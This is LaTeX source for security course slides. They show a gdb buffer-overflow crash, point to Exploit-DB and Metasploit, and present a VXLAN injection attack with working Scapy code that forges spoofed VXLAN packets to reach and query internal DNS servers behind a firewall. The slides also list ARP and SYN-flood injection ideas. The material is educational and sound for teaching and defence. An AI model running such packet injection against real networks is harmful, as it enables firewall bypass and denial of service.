Reading symbols for shared libraries .. done
(gdb) {\bf run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}
Starting program: /Volumes/userdata/projects/security/exploit/demo/demo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Reading symbols for shared libraries . done
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal EXC_BAD_ACCESS, Could not access memory.
{\bf 0x41414140} in ?? ()
(gdb)
\end{alltt}



\slide{The Exploit Database -- dagens buffer overflow}

\hlkimage{13cm}{exploit-db.png}

\centerline{\link{http://www.exploit-db.com/}}

\slide{Metasploit and Armitage Still rocking the internet}


\hlkimage{14cm}{metasploit-about.png}

\begin{list1}

\item \link{http://www.metasploit.com/}
\item Armitage GUI fast and easy hacking for Metasploit\\
\link{http://www.fastandeasyhacking.com/}\\
\link{http://www.offensive-security.com/metasploit-unleashed/Main_Page}
\end{list1}

\slide{Demo: Scapy pakker }

\hlkimage{21cm}{vxlan-basic.png}

Taking an excerpt from my talk on TROOPERS19\\
{\footnotesize\link{https://github.com/kramse/security-courses/tree/master/presentations/network/vxlan-troopers19}}

\slide{Overview VXLAN RFC7348 2014}

\hlkimage{18cm}{vxlan-basic.png}

How does it work?

\begin{list2}
\item Router 1 takes Layer 2 traffic, encapsulates with IP+UDP port 4789, routes
\item Router 2 receives IP+UDP+data, decapsulates, forward/switches layer 2 onto VLAN
\item Hosts 10.0.0.10 can talk to 10.0.0.20 as if they where next to each other in switch
\item Most often VLAN IEEE 802.1q involved too, but not shown
%\item Lets only consider two routers
\end{list2}

%\centerline{Quite easy to get a working lab with Linux or OpenBSD \smiley}

\slide{But what about security}

VXLAN does not by itself provide ANY security,
none, zip, nothing, nada! \\
No confidentiality. No integrity protection.

\vskip 5mm

Ways to protect:
\begin{list2}
\item Just configure the firewall, router ACL, etc - does not really work
\item Just isolate so no-one from the outside can send traffic, BCP38 please
\item Then what about from inside your data center, from partners, your servers
\end{list2}

\vskip 1cm
{\Large We currently have huge gaps in understanding these\\
issues - and missing security tool coverage}


\slide{VXLAN injection}

\hlkimage{19cm}{vxlan-basic-injection.png}

I tested using my pentest server in one AS, sending across an internet exchange into a production network, towards Arista testing devices - no problems, it's just routed layer 3 IP+UDP packets

\slide{Example attacks, What is possible VXLAN Header}

\begin{alltt}\footnotesize
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|R|R|R|R|I|R|R|R|            Reserved                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                VXLAN Network Identifier (VNI) |   Reserved    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
Inner Ethernet Header:
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             Inner Destination MAC Address                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Inner Destination MAC Address | Inner Source MAC Address      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                Inner Source MAC Address                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|OptnlEthtype = C-Tag 802.1Q    | Inner.VLAN Tag Information    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
\end{alltt}

\begin{list2}
\item Inject ARP traffic, send arbitrary ARP packets to hosts, connectivity DoS
\item Inject TCP like SYN traffic behind the firewall, wire speed SYN flooding
\item Inject UDP packets and get responses sent out through firewall\\
Really anything IPv4 and IPv6 can be injected
\end{list2}


\slide{Example: Send UDP DNS reqs to inside server}

\hlkimage{20cm}{vxlan-basic-injection-dns.pdf}

%One interesting attack is injecting UDP packets to allow DNS\\
%requests to inside server which might not even have public IP

%\begin{enumerate}
%\item Select target: internal server, 10.0.0.10 and DNS service 53/UDP
%\item Create VXLAN packet(s): DNS request dst 10.0.0.10 UDP dport 53
%\item Source for this probe is your external pentest server
%\item Make sure inside packet has Ethernet destination that reaches server
%\item Send spoofed VXLAN packet across internet
%\item After VXLAN decap this packet is sent to the server
%\item Server process DNS request, send back response
%\item Attacker waiting for the UDP DNS reply, gets it
%\end{enumerate}

{\footnotesize Attacker can send UDP DNS request to inside server on RFC1918 destination\\
Note: server has no external IP or incoming ports forwarded.\\
Tested working with Clavister with DNS UDP probes/requests, no inspection }


\slide{Snippets of Scapy}

First create VXLAN header and inside packet
\begin{minted}[fontsize=\small]{python}
vxlanport=4789     # RFC 7384 port 4789, Linux kernel default 8472
vni=37             # Usually VNI == destination VLAN
vxlan=Ether(dst=routermac)/IP(src=vtepsrc,dst=vtepdst)/
   UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vni,flags="Instance")
broadcastmac="ff:ff:ff:ff:ff:ff"
randommac="00:51:52:01:02:03"
attacker="185.27.115.666"
destination="10.0.0.10"
# port is the one we want to contact inside the firewall
insideport=53
testport=54040
packet=vxlan/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,
    dst=destination)/UDP(sport=testport,dport=insideport)/
    DNS(rd=1,id=0xdead,qd=DNSQR(qname="www.wikipedia.org"))
\end{minted}

{\footnotesize Fun fact, Unbound on OpenBSD reply to DNS requests received in Ethernet packets with broadcast destination and IP destination being the IP of the server}



\slide{Send and receive - from another source}

Send and then wait for something, not from same IP bc from\\
inside NAT, but port should be OK
\begin{minted}[fontsize=\small]{python}
pid = os.fork()
if pid:
    print "parent: setting up sniffing"
    # Wait for UDP packet
    data = sniff(filter="udp and port 54040 and net 192.0.2.0/24", count=1)
else:
    time.sleep(10)
    print "child: sending packet"
    sendp(packet,loop=0)
    print "child: closing"
    sys.exit(0)
data[0].show()
\end{minted}

Source port in the inside request packet, becomes the destination port in replies from the server - 54040


\slide{Security devops}

\begin{list1}
\item We need devops skillz in security
\item automate, security is also big data
\item integrate tools, transfer, sort, search, pattern matching, statistics, ...
\item tools, languages, databases, protocols, data formats
\item Use Github! Der er så mange biblioteker og programmer, noget eksisterende løser måske dit problem 90%
\item Example introductions:
\begin{list2}
\item Seven languages/database/web frameworks in Seven Weeks
\item Elasticsearch the definitive guide
\end{list2}
\end{list1}

\centerline{We are all Devops now, even security people!}


\myquestionspage



\slide{Exploit components}

\begin{list1}
\item Shellcoders Handbook  and Grayhat chapters 12-14
\item Difference between the oldest, most simple stack based overflows
\item The parts of a shell code running system calls
\item How to avoid having shell code - return into libc, calling functions
\item This will teach us why modern operating systems have multiple methods designed to remove each case of exploiting
\item Allow us to understand the next subject, Return-Oriented Programming (ROP)
\end{list1}

Recommended shell code video:\\
EXPLORING NEW DEPTHS OF THREAT HUNTING ...OR HOW TO WRITE ARM SHELLCODE IN SIX MINUTES\\
Speaker: Maria Markstedter, Azeria Labs\\
\link{https://www.youtube.com/watch?v=DGJZBDlhIGU}


\slide{Return-Oriented Programming (ROP)}

\begin{list1}
\item Advanced subject Return-Oriented Programming (ROP)
\item \emph{Return-Oriented Programming:Systems, Languages, and Applications}
Ryan Roemer, Erik Buchanan, Hovav Shacam and Stefan Savage University of California, San Diego\\
\link{https://hovav.net/ucsd/dist/rop.pdf}
\item Then look into how a security oriented operating system has decided to prevent this method:
\item \emph{Removing ROP Gadgets from OpenBSD}
Todd Mortimer\\
\link{https://www.openbsd.org/papers/asiabsdcon2019-rop-paper.pdf}
\end{list1}

\slide{Setup the OWASP Juice Shop}

\begin{list1}
\item Recommmended for all developers: Try running the OWASP Juice Shop
\item This is an application which is modern AND designed to have security flaws.
\item Read more about this project at:\\
\link{https://www2.owasp.org/www-project-juice-shop/} and\\ \link{https://github.com/bkimminich/juice-shop}
\item It is recommended to buy the Pwning OWASP Juice Shop Official companion guide to the OWASP Juice Shop from https://leanpub.com/juice-shop - suggested price USD 5.99. Alternatively read online at https://pwning.owasp-juice.shop/
\item Sometimes the best method is running the Docker version
\end{list1}


\slide{Lab setup and Nmap Workshop}

\begin{list2}
\item Let says you want to do this, then go and do two things, after:
\item Prepare/finish your lab setup\\
\url{https://github.com/kramse/kramse-labs}

\item Switch to the materials found in my Nmap Workshop and perform Nmap scans\\
\url{https://github.com/kramse/security-courses/tree/master/courses/pentest/nmap-workshop}
\end{list2}


\end{document}
